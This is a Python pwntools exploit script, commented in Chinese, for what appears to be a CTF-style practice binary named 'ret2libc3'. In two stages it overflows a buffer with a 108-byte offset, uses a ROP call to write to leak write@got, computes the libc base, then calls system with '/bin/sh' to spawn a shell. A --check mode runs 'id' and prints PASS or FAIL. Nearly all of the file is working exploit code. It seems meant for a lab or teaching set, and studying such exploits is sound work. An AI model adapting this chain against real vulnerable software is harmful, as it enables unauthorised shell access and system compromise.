#!/usr/bin/env python3
"""ret2libc3：既没有 system@plt 也没有 "/bin/sh"，需要先泄漏 libc

两阶段：
  第一阶段  write(1, write@got, 4) 泄漏 write 的真实地址，然后返回到 main
  第二阶段  用 libc 基址算出 system 与 "/bin/sh" 的地址，重新打一次
"""
import sys

from pwn import context, ELF, p32, process

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2libc3"
LIBC = "./libc.so.6"  # 由 scripts/build_all.sh 从容器内复制
CHECK = "--check" in sys.argv
OFFSET = 108


def build_stage1(elf):
    return b"".join(
        [
            p32(elf.plt["write"]),
            p32(elf.symbols["main"]),   # write 的返回地址：回到 main 再来一轮
            p32(1),                     # fd
            p32(elf.got["write"]),      # buf
            p32(4),                     # count
        ]
    )


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    libc = ELF(LIBC, checksec=False)

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(b"A" * OFFSET + build_stage1(elf))

    # 第一步先打印 "done."，随后 write(1, write@got, 4) 才泄漏 4 字节真实地址
    p.recvuntil(b"done.\n")
    leak = p.recvn(4)
    write_addr = int.from_bytes(leak, "little")
    libc_base = write_addr - libc.symbols["write"]
    system_addr = libc_base + libc.symbols["system"]
    binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

    p.recvuntil(b"input:")
    p.sendline(
        b"A" * OFFSET + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr)
    )

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(
        f"[ret2libc3] {'PASS' if ok else 'FAIL'}  "
        f"write={write_addr:#x} libc_base={libc_base:#x} "
        f"system={system_addr:#x} binsh={binsh_addr:#x}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())